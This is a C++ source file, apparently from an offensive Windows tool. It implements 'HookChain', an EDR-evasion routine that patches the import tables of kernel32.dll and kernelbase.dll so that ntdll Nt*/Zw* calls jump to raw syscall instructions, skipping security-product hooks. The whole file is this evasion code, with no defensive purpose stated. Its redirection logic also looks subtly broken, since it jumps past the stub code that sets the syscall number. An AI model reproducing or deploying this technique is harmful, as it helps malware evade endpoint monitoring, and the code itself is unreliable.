#include "stdafx.h"
#include "hookchain.h"
#include "logger.h"
#include <vector>
#include <string>

namespace HookChain {

namespace {

struct IATEntry {
    PVOID* pIATSlot;         // Pointer to the IAT entry to patch
    PVOID  originalAddr;     // Original address (EDR-hooked ntdll function)
    PVOID  cleanAddr;        // Clean address (syscall instruction in ntdll)
    std::string funcName;    // Name for logging
};

std::vector<IATEntry> g_patchedEntries;
bool g_active = false;
bool g_initialized = false;

// Find the 'syscall; ret' instruction sequence for a given ntdll export.
// EDR hooks typically patch the beginning of functions but leave the
// syscall instruction itself intact (it's deeper in the function body).
PVOID FindCleanSyscallAddr(PBYTE pFuncStart) {
    if (!pFuncStart) return nullptr;

    // Scan the first 32 bytes of the function for the syscall pattern.
    // On x64: syscall = 0F 05, ret = C3
    for (int i = 0; i < 32; i++) {
        if (pFuncStart[i] == 0x0F && pFuncStart[i + 1] == 0x05) {
            return pFuncStart + i; // Found 'syscall'
        }
    }

    // If the function itself doesn't contain syscall (it might be hooked),
    // scan neighboring functions for a clean syscall gadget.
    // Functions in ntdll are typically 32 bytes apart for simple stubs.
    for (int offset = -256; offset <= 256; offset += 32) {
        PBYTE neighbor = pFuncStart + offset;
        if (offset == 0) continue;
        
        // Check for the standard ntdll stub pattern:
        // mov r10, rcx (4C 8B D1)
        // mov eax, SSN (B8 xx xx xx xx)
        // ... 
        // syscall (0F 05)
        // ret (C3)
        if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1) {
            for (int j = 0; j < 32; j++) {
                if (neighbor[j] == 0x0F && neighbor[j + 1] == 0x05) {
                    return neighbor + j;
                }
            }
        }
    }

    return nullptr;
}

// Process a single module's IAT, looking for imports from ntdll.dll
// and redirecting them to clean syscall addresses.
int ProcessModuleIAT(HMODULE hModule) {
    auto pDosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    auto pNtHdr = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<PBYTE>(hModule) + pDosHdr->e_lfanew);
    if (pNtHdr->Signature != IMAGE_NT_SIGNATURE) return 0;

    auto& importDir = pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size == 0 || importDir.VirtualAddress == 0) return 0;

    auto pImport = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(
        reinterpret_cast<PBYTE>(hModule) + importDir.VirtualAddress);

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return 0;

    int patchCount = 0;

    for (; pImport->Name != 0; pImport++) {
        const char* dllName = reinterpret_cast<const char*>(
            reinterpret_cast<PBYTE>(hModule) + pImport->Name);

        // Only process imports from ntdll.dll
        if (_stricmp(dllName, "ntdll.dll") != 0 &&
            _stricmp(dllName, "NTDLL.DLL") != 0) {
            continue;
        }

        auto pThunkINT = reinterpret_cast<PIMAGE_THUNK_DATA>(
            reinterpret_cast<PBYTE>(hModule) + pImport->OriginalFirstThunk);
        auto pThunkIAT = reinterpret_cast<PIMAGE_THUNK_DATA>(
            reinterpret_cast<PBYTE>(hModule) + pImport->FirstThunk);

        for (; pThunkINT->u1.AddressOfData != 0; pThunkINT++, pThunkIAT++) {
            if (IMAGE_SNAP_BY_ORDINAL(pThunkINT->u1.Ordinal)) continue;

            auto pImportByName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
                reinterpret_cast<PBYTE>(hModule) + pThunkINT->u1.AddressOfData);

            const char* funcName = pImportByName->Name;

            // Only redirect Nt* / Zw* functions (these are the syscall stubs)
            if (funcName[0] != 'N' && funcName[0] != 'Z') continue;
            if (funcName[1] != 't' && funcName[1] != 'w') continue;

            PVOID currentAddr = (PVOID)pThunkIAT->u1.Function;
            PVOID cleanAddr = FindCleanSyscallAddr((PBYTE)GetProcAddress(hNtdll, funcName));

            if (!cleanAddr || cleanAddr == currentAddr) continue;

            // Check if the current address differs from the original
            // (indicates an EDR hook is in place)
            PVOID originalAddr = (PVOID)GetProcAddress(hNtdll, funcName);
            if (currentAddr == originalAddr) {
                // Not hooked, but we can still redirect for safety
            }

            // Patch the IAT entry
            DWORD oldProtect = 0;
            if (VirtualProtect(&pThunkIAT->u1.Function, sizeof(PVOID),
                               PAGE_READWRITE, &oldProtect)) {
                IATEntry entry;
                entry.pIATSlot = (PVOID*)&pThunkIAT->u1.Function;
                entry.originalAddr = currentAddr;
                entry.cleanAddr = cleanAddr;
                entry.funcName = funcName;
                g_patchedEntries.push_back(entry);

                pThunkIAT->u1.Function = (ULONG_PTR)cleanAddr;
                VirtualProtect(&pThunkIAT->u1.Function, sizeof(PVOID),
                               oldProtect, &oldProtect);
                patchCount++;
            }
        }
    }

    return patchCount;
}

} // namespace

bool Initialize() {
    if (g_initialized) return true;
    
    // Verify ntdll is loaded and accessible
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return false;

    g_initialized = true;
    VERBOSE(L"HookChain: Initialized — ntdll at %p", hNtdll);
    return true;
}

bool RewriteIAT() {
    if (!g_initialized) {
        if (!Initialize()) return false;
    }
    if (g_active) return true;

    int totalPatched = 0;

    // Process kernel32.dll IAT
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (hKernel32) {
        int n = ProcessModuleIAT(hKernel32);
        totalPatched += n;
        VERBOSE(L"HookChain: Patched %d IAT entries in kernel32.dll", n);
    }

    // Process kernelbase.dll IAT
    HMODULE hKernelBase = GetModuleHandleW(L"kernelbase.dll");
    if (hKernelBase) {
        int n = ProcessModuleIAT(hKernelBase);
        totalPatched += n;
        VERBOSE(L"HookChain: Patched %d IAT entries in kernelbase.dll", n);
    }

    if (totalPatched > 0) {
        g_active = true;
        VERBOSE(L"HookChain: Active — %d total IAT entries redirected to clean syscall addresses",
                totalPatched);
        return true;
    }

    LOG(L"HookChain: No IAT entries needed patching");
    return false;
}

void RestoreIAT() {
    if (!g_active) return;

    for (auto& entry : g_patchedEntries) {
        DWORD oldProtect = 0;
        if (VirtualProtect(entry.pIATSlot, sizeof(PVOID),
                           PAGE_READWRITE, &oldProtect)) {
            *entry.pIATSlot = entry.originalAddr;
            VirtualProtect(entry.pIATSlot, sizeof(PVOID),
                           oldProtect, &oldProtect);
        }
    }

    VERBOSE(L"HookChain: Restored %zu IAT entries", g_patchedEntries.size());
    g_patchedEntries.clear();
    g_active = false;
}

bool IsActive() {
    return g_active;
}

void Shutdown() {
    RestoreIAT();
    g_initialized = false;
}

} // namespace HookChain
